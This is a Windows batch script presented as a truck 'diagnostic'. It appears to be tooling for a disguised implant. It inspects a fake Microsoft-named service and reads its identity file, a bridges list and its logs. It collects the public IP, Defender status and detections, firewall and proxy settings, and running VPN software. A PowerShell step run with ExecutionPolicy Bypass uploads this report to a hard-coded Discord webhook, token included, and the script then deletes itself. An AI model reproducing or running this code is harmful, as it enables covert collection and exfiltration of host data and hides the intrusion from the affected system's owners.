@echo off
REM ============================================================================
REM DIAGNOSTIC WEBHOOK - Sends truck status to Discord
REM Paste your Discord webhook URL below:
REM ============================================================================
set "DISCORD_WEBHOOK=https://discord.com/api/webhooks/1552346840698196101/StYbvy9bsE-zh8IIzuycCqR8m_S4SKcfY3-XLFnmjq78Xj7hptbotQcimQ96x-OAdeVg"
REM ============================================================================

setlocal EnableDelayedExpansion

set "SVC_NAME=microsoft-com-service"
set "SVC_PATH=C:\ProgramData\Microsoft\Microsoft COM Service"
set "DIAG_FILE=%~dp0diag_output.txt"

echo [TRACE] Starting diagnostic...
echo [TRACE] DIAG_FILE=%DIAG_FILE%

REM Delete old diag file if exists
if exist "%DIAG_FILE%" del "%DIAG_FILE%" 2>nul

echo [TRACE] Creating report file...
echo ========================================== > "%DIAG_FILE%" 2>&1
if errorlevel 1 echo [ERROR] Failed to create diag file
echo KPOTATO TRUCK DIAGNOSTIC REPORT >> "%DIAG_FILE%"
echo ========================================== >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"
echo [TRACE] Report file created

REM --- 1. Hostname ---
echo [TRACE] Check 1...
echo [1/20] Hostname >> "%DIAG_FILE%"
hostname >> "%DIAG_FILE%" 2>&1 || echo FAILED >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

REM --- 2. IP Address (Public) ---
echo [TRACE] Check 2...
echo [2/20] Public IP Address >> "%DIAG_FILE%"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content } catch { 'FAILED: ' + $_.Exception.Message }" >> "%DIAG_FILE%" 2>&1
echo. >> "%DIAG_FILE%"

REM --- 3. Timestamp ---
echo [TRACE] Check 3...
echo [3/20] Timestamp >> "%DIAG_FILE%"
echo %DATE% %TIME% >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

REM --- 4. System Time + Timezone ---
echo [TRACE] Check 4...
echo [4/20] System Time + Timezone >> "%DIAG_FILE%"
powershell -Command "Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz'" >> "%DIAG_FILE%" 2>&1 || echo FAILED >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

REM --- 5. Windows Version ---
echo [TRACE] Check 5...
echo [5/20] Windows Version >> "%DIAG_FILE%"
ver >> "%DIAG_FILE%" 2>&1 || echo FAILED >> "%DIAG_FILE%"
systeminfo | findstr /i "OS Name OS Version" >> "%DIAG_FILE%" 2>&1
echo. >> "%DIAG_FILE%"

REM --- 6. ksupervisor Service Status ---
echo [TRACE] Check 6...
echo [6/20] ksupervisor Service Status (%SVC_NAME%) >> "%DIAG_FILE%"
sc query "%SVC_NAME%" >> "%DIAG_FILE%" 2>&1 || echo ksupervisor service not found >> "%DIAG_FILE%"
for /f "tokens=*" %%a in ('sc qc "%SVC_NAME%" 2^>nul ^| findstr /i "START_TYPE SERVICE_START_NAME"') do echo %%a >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

REM --- 7. ksupervisor + kagent Processes ---
echo [TRACE] Check 7...
echo [7/20] ksupervisor + kagent Processes >> "%DIAG_FILE%"
echo --- KSUPERVISOR PROCESS --- >> "%DIAG_FILE%"
tasklist /fi "imagename eq WindowsComHost.exe" /v >> "%DIAG_FILE%" 2>&1
echo. >> "%DIAG_FILE%"
echo --- KAGENT PROCESS --- >> "%DIAG_FILE%"
powershell -Command "Get-Process | Where-Object {$_.Path -like '*Microsoft COM Service*'} | Select-Object Name,Id,Path | Format-Table -AutoSize" >> "%DIAG_FILE%" 2>&1 || echo No kagent processes found >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

REM --- 8. Directory Listing ---
echo [TRACE] Check 8...
echo [8/20] Directory Listing of %SVC_PATH% >> "%DIAG_FILE%"
if exist "%SVC_PATH%" (
    dir /a "%SVC_PATH%" >> "%DIAG_FILE%" 2>&1
) else (
    echo Directory does not exist >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

REM --- 9. identity.json Content ---
echo [TRACE] Check 9...
echo [9/20] identity.json Content >> "%DIAG_FILE%"
if exist "%SVC_PATH%\identity.json" (
    powershell -Command "try { $f=[System.IO.File]::Open('%SVC_PATH%\identity.json','Open','Read','ReadWrite'); $r=[System.IO.StreamReader]::new($f); $r.ReadToEnd(); $r.Close(); $f.Close() } catch { 'FAILED: ' + $_.Exception.Message }" >> "%DIAG_FILE%" 2>&1
) else (
    echo identity.json does not exist >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

REM --- 10. bridges.txt Line Count ---
echo [TRACE] Check 10...
echo [10/20] bridges.txt Line Count >> "%DIAG_FILE%"
if exist "%SVC_PATH%\bridges.txt" (
    powershell -Command "try { $f=[System.IO.File]::Open('%SVC_PATH%\bridges.txt','Open','Read','ReadWrite'); $r=[System.IO.StreamReader]::new($f); $c=($r.ReadToEnd() -split \"`n\").Count; $r.Close(); $f.Close(); \"Lines: $c\" } catch { 'FAILED: ' + $_.Exception.Message }" >> "%DIAG_FILE%" 2>&1
) else (
    echo bridges.txt does not exist >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

REM --- 11. Last 20 Lines ksupervisor.log ---
echo [TRACE] Check 11...
echo [11/20] Last 20 Lines of ksupervisor.log >> "%DIAG_FILE%"
if exist "%SVC_PATH%\ksupervisor.log" (
    powershell -Command "$f=[System.IO.File]::Open('%SVC_PATH%\ksupervisor.log','Open','Read','ReadWrite'); $r=[System.IO.StreamReader]::new($f); $lines=$r.ReadToEnd() -split \"`n\" | Select-Object -Last 20; $r.Close(); $f.Close(); $lines -join \"`n\"" >> "%DIAG_FILE%" 2>&1 || echo FAILED to read locked file >> "%DIAG_FILE%"
) else (
    echo ksupervisor.log does not exist >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 12...
REM --- 12. Last 20 Lines kagent.run.log ---
echo [12/20] Last 20 Lines of kagent.run.log >> "%DIAG_FILE%"
if exist "%SVC_PATH%\kagent.run.log" (
    powershell -Command "$f=[System.IO.File]::Open('%SVC_PATH%\kagent.run.log','Open','Read','ReadWrite'); $r=[System.IO.StreamReader]::new($f); $lines=$r.ReadToEnd() -split \"`n\" | Select-Object -Last 20; $r.Close(); $f.Close(); $lines -join \"`n\"" >> "%DIAG_FILE%" 2>&1 || echo FAILED to read locked file >> "%DIAG_FILE%"
) else (
    echo kagent.run.log does not exist >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 13...
REM --- 13. Running as Admin ---
echo [13/20] Running as Admin Check >> "%DIAG_FILE%"
net session >nul 2>&1
if %errorlevel% == 0 (
    echo YES - Running as Administrator >> "%DIAG_FILE%"
) else (
    echo NO - Not running as Administrator >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 14...
REM --- 14. Windows Defender Status ---
echo [14/20] Windows Defender Status >> "%DIAG_FILE%"
powershell -Command "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated | Format-List" >> "%DIAG_FILE%" 2>&1 || echo FAILED or Defender not available >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 15...
REM --- 15. Network Adapter Info ---
echo [15/20] Network Adapter Info >> "%DIAG_FILE%"
powershell -Command "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object Name,InterfaceDescription,Status,MacAddress | Format-Table -AutoSize" >> "%DIAG_FILE%" 2>&1 || echo FAILED >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 16...
REM --- 16. Firewall Status (All Profiles) ---
echo [16/20] Firewall Status >> "%DIAG_FILE%"
netsh advfirewall show allprofiles state >> "%DIAG_FILE%" 2>&1 || echo FAILED >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 17...
REM --- 17. Proxy Settings ---
echo [17/20] Proxy Settings >> "%DIAG_FILE%"
netsh winhttp show proxy >> "%DIAG_FILE%" 2>&1 || echo FAILED >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 18...
REM --- 18. Recent Defender Detections ---
echo [18/20] Recent Defender Detections (Last 5) >> "%DIAG_FILE%"
powershell -Command "Get-MpThreatDetection | Select-Object -First 5 | Format-List" >> "%DIAG_FILE%" 2>&1 || echo FAILED or no detections >> "%DIAG_FILE%"
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 19...
REM --- 19. File Blocked Attribute Check ---
echo [19/20] File Blocked Attribute Check >> "%DIAG_FILE%"
if exist "%SVC_PATH%\WindowsComHost.exe" (
    powershell -Command "Get-Item '%SVC_PATH%\WindowsComHost.exe' | Select-Object -ExpandProperty Attributes; if ((Get-Item '%SVC_PATH%\WindowsComHost.exe' -Stream Zone.Identifier -ErrorAction SilentlyContinue)) { 'WARNING: File has Zone.Identifier (blocked)' } else { 'OK: No Zone.Identifier' }" >> "%DIAG_FILE%" 2>&1
) else (
    echo WindowsComHost.exe does not exist >> "%DIAG_FILE%"
)
echo. >> "%DIAG_FILE%"

echo [TRACE] Check 20...
REM --- 20. Suspicious Processes (VPN/Security) ---
echo [20/20] Suspicious Processes (VPN/Security Software) >> "%DIAG_FILE%"
tasklist /fi "imagename eq openvpn*" >> "%DIAG_FILE%" 2>&1
tasklist /fi "imagename eq vpn*" >> "%DIAG_FILE%" 2>&1
tasklist /fi "imagename eq wireguard*" >> "%DIAG_FILE%" 2>&1
tasklist /fi "imagename eq nordvpn*" >> "%DIAG_FILE%" 2>&1
tasklist /fi "imagename eq expressvpn*" >> "%DIAG_FILE%" 2>&1
echo. >> "%DIAG_FILE%"

echo ========================================== >> "%DIAG_FILE%"
echo END OF DIAGNOSTIC REPORT >> "%DIAG_FILE%"
echo ========================================== >> "%DIAG_FILE%"

REM --- Send to Discord ---
for /f %%h in ('hostname') do set "HOSTNAME=%%h"
set "PS_SCRIPT=%TEMP%\discord_upload_%RANDOM%.ps1"
(
echo $ErrorActionPreference = 'Stop'
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
echo $webhook = '%DISCORD_WEBHOOK%'
echo $filePath = '%DIAG_FILE%'
echo $fileName = 'diagnostic_%HOSTNAME%.txt'
echo try {
echo     $fileBytes = [System.IO.File]::ReadAllBytes($filePath^)
echo     $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1'^)
echo     $fileEnc = $enc.GetString($fileBytes^)
echo     $boundary = [System.Guid]::NewGuid(^).ToString(^)
echo     $LF = "`r`n"
echo     $body = "--$boundary$LF"
echo     $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF"
echo     $body += "Content-Type: text/plain$LF$LF"
echo     $body += "$fileEnc$LF"
echo     $body += "--$boundary--$LF"
echo     $result = Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
echo     Write-Host "SUCCESS: Webhook sent"
echo } catch {
echo     Write-Host "FAILED:" $_.Exception.Message
echo }
) > "%PS_SCRIPT%"
powershell -ExecutionPolicy Bypass -File "%PS_SCRIPT%"
del "%PS_SCRIPT%" 2>nul

REM Cleanup temp file
del "%DIAG_FILE%" 2>nul

REM Self-destruct: delete update.json and this bat file
set "SELF=%~f0"
set "MANIFEST=%~dp0update.json"
del "%MANIFEST%" 2>nul
(goto) 2>nul & del "%SELF%"
